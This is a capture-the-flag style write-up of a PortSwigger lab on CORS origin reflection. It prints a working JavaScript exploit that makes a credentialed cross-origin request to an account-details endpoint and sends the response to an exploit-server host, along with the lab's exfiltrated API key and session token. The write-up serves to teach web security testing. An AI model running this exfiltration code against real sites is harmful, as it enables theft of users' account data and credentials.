# CORS vulnerability with basic origin reflection

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack), you'll learn: CORS vulnerability with basic origin reflection! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This website has an insecure [CORS](https://portswigger.net/web-security/cors) configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-1/images/Pasted%20image%2020221227053046.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-1/images/Pasted%20image%2020221227053056.png)

**In the Burp Suite's HTTP history, I found something interesting:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-1/images/Pasted%20image%2020221227054354.png)

When we're logged in, it'll also send a GET request to `/accountDetails`, and **the response header has `Access-Control-Allow-Credentials`**, which indicates that the web application supports CORS(Cross-Origin Resource Sharing).

**Let's send that request to Burp Repeter, and add a HTTP header called `Origin`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-1/images/Pasted%20image%2020221227054705.png)

Note that the origin is reflected in the `Access-Control-Allow-Origin` response header.

**Hmm... What if an attacker can send a GET request to `/accountDetails`, and retrieve sensitive information?**

**To do so, I'll write a HTML file to do that, host it on the exploit server, and deliver the exploit to the victim:**
```html
<html>
    <head>
        <title>CORS-1</title>
    </head>
    <body>
        <script>
            var req = new XMLHttpRequest();
            req.onload = reqListener;
            req.open('get','https://0ab5004903f59d88c017e57d003e0078.web-security-academy.net/accountDetails',true);
            req.withCredentials = true;
            req.send();

            function reqListener() {
              location='//exploit-0a28004803ec9dcac025e4430179005c.exploit-server.net/?data='+this.responseText;
            };
        </script>
    </body>
</html>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-1/images/Pasted%20image%2020221227054917.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-1/images/Pasted%20image%2020221227055023.png)

**We successfully retrieved victim's data!**
```json
{
    "username": "administrator",
    "email": "",
    "apikey": "LzZwsDlAMoTuJAwINt8FJJipytW0Adbx",
    "sessions": [
        "xcu3ZpRXDah5K0V5r7TLbz5hMDLDiFGZ"
    ]
}
```

Let's submit the API key!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-1/images/Pasted%20image%2020221227055235.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-1/images/Pasted%20image%2020221227055254.png)

# What we've learned:

1. CORS vulnerability with basic origin reflection